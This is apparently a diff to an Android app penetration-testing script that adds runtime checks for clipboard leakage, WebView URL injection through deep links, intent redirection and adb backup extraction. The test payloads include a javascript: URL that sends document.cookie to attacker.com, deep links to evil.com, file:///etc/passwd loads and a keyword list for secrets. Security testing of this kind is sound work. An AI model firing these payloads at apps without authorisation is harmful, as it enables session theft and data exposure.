@@ -145,6 +145,122 @@ def run(workdir, package_id, device_serial=None):
     else:
         print("    ✓ Screenshot blocked (FLAG_SECURE active)")
 
+    # 6. Clipboard Data Leakage
+    print("\\n[*] Checking clipboard exposure...")
+    results["tested"].append("clipboard")
+    # Set sensitive data in clipboard, check if app reads it or if it persists after app closes
+    terminal(f"{adb} shell am broadcast -a clipper.set -e text 'SENSITIVE_TOKEN_12345'", timeout=5)
+    terminal("sleep 2")
+    # Launch app
+    terminal(f"{adb} shell monkey -p {package_id} -c android.intent.category.LAUNCHER 1 2>/dev/null")
+    terminal("sleep 3")
+    # Check if app accessed clipboard (Android 12+ shows toast, logcat shows access)
+    r = terminal(f"{adb} logcat -d -t 50 | grep -i 'clipboard\\|ClipData\\|paste' | grep -i {package_id} | head -10")
+    if r["output"].strip():
+        print("    ⚠️  App accesses clipboard data")
+        results["findings"].append(("clipboard_read", "App reads clipboard (potential token/seed theft)", "Medium"))
+        write_file(os.path.join(outdir, "clipboard_access.txt"), r["output"])
+    else:
+        print("    ✓ No clipboard access detected")
+
+    # Check if sensitive data persists in clipboard after use
+    r = terminal(f"{adb} shell service call clipboard 1 s16 com.android.shell 2>/dev/null | strings", timeout=5)
+    clipboard_content = r.get("output", "")
+    if any(k in clipboard_content.lower() for k in ["bearer", "eyj", "password", "token", "seed", "mnemonic"]):
+        results["findings"].append(("clipboard_persist", "Sensitive data remains in clipboard after use", "Medium"))
+        print("    ⚠️  Sensitive data persists in clipboard")
+
+    # 7. WebView URL Injection Testing
+    print("\\n[*] Testing WebView URL injection...")
+    results["tested"].append("webview_injection")
+    webview_results = []
+
+    # Test via deep links that might open WebViews
+    webview_urls = [
+        f"{schemes[0]}://webview?url=https://evil.com" if schemes else "",
+        f"{schemes[0]}://web?url=javascript:alert(1)" if schemes else "",
+        f"{schemes[0]}://open?link=file:///etc/passwd" if schemes else "",
+        f"{schemes[0]}://browser?page=https://evil.com/phish" if schemes else "",
+    ]
+    webview_params = ["url", "link", "page", "web_url", "redirect", "goto", "open"]
+
+    for scheme in schemes:
+        for param in webview_params:
+            test_url = f"{scheme}://{param}?{param}=https://attacker.com"
+            r = terminal(f"{adb} shell am start -a android.intent.action.VIEW -d '{test_url}' {package_id} 2>&1")
+            if "Error" not in r.get("output", ""):
+                # Check if a WebView loaded (wait and check current activity)
+                terminal("sleep 2")
+                activity = terminal(f"{adb} shell dumpsys activity top | grep -i 'webview\\|browser\\|web' | head -3")
+                if activity.get("output", "").strip():
+                    webview_results.append(f"{test_url} → WebView opened (potential phishing/XSS)")
+                    results["findings"].append(("webview_url_injection",
+                        f"WebView opened with attacker URL via {scheme}://{param}", "High"))
+                    print(f"    🔴 WebView URL injection: {scheme}://{param}")
+                    break
+
+    # Test javascript: scheme in WebView
+    if schemes:
+        js_test = f"{schemes[0]}://webview?url=javascript:document.location='https://attacker.com/steal?c='%2bdocument.cookie"
+        r = terminal(f"{adb} shell am start -a android.intent.action.VIEW -d '{js_test}' {package_id} 2>&1")
+        if "Error" not in r.get("output", ""):
+            webview_results.append(f"javascript: scheme accepted in deep link WebView parameter")
+            results["findings"].append(("webview_js_injection", "JavaScript URL accepted in WebView parameter", "Critical"))
+            print("    🔴 CRITICAL: javascript: scheme accepted!")
+
+    if webview_results:
+        write_file(os.path.join(outdir, "webview_injection.txt"), "\\n".join(webview_results))
+    elif not schemes:
+        print("    Skipped (no deep link schemes)")
+    else:
+        print("    ✓ No WebView injection found")
+
+    # 8. Intent Redirect / Implicit Intent Hijacking
+    print("\\n[*] Testing intent redirect vulnerabilities...")
+    results["tested"].append("intent_redirect")
+
+    # Check for activities that accept arbitrary intents and forward them
+    if os.path.isfile(manifest_full):
+        # Find activities with intent filters that could be redirected
+        intent_filters = re.findall(
+            r'<activity[^>]*android:name="([^"]+)"[^>]*>.*?<intent-filter>.*?</intent-filter>',
+            manifest, re.DOTALL)
+
+        # Test intent redirection via extras
+        redirect_intents = [
+            f"{adb} shell am start -n {package_id}/.MainActivity --es redirect_url https://evil.com",
+            f"{adb} shell am start -n {package_id}/.MainActivity --es next_activity com.attacker.evil",
+            f"{adb} shell am start -n {package_id}/.DeepLinkActivity --es url https://evil.com",
+        ]
+        for intent_cmd in redirect_intents:
+            r = terminal(intent_cmd + " 2>&1")
+            if "Error" not in r.get("output", "") and "SecurityException" not in r.get("output", ""):
+                terminal("sleep 1")
+                # Check if redirect happened
+                top = terminal(f"{adb} shell dumpsys activity top | head -5")
+                if "evil" in top.get("output", "").lower() or "chrome" in top.get("output", "").lower():
+                    results["findings"].append(("intent_redirect",
+                        "Activity forwards intent to attacker-controlled destination", "High"))
+                    print("    🔴 Intent redirect: activity forwards to attacker URL")
+                    break
+
+    # 9. Backup Extraction (android:allowBackup check)
+    print("\\n[*] Checking backup exposure...")
+    results["tested"].append("backup_check")
+    if os.path.isfile(manifest_full):
+        if 'android:allowBackup="true"' in manifest or 'android:allowBackup' not in manifest:
+            # Try actual backup
+            r = terminal(f"{adb} backup -f /tmp/app_backup.ab -noapk {package_id} 2>&1", timeout=15)
+            if os.path.isfile("/tmp/app_backup.ab"):
+                size_r = terminal("ls -la /tmp/app_backup.ab")
+                results["findings"].append(("backup_enabled", "App backup enabled — data extractable via adb backup", "Low-Medium"))
+                print("    ⚠️  Backup enabled and extractable")
+                terminal("rm -f /tmp/app_backup.ab")
+            else:
+                print("    ✓ Backup blocked at runtime (even if manifest allows)")
+        else:
+            print("    ✓ allowBackup=false")
+
     # Write summary report
     report = "# Phase 6: Runtime Testing Results\\n\\n"
     report += f"## Tests Completed\\n"
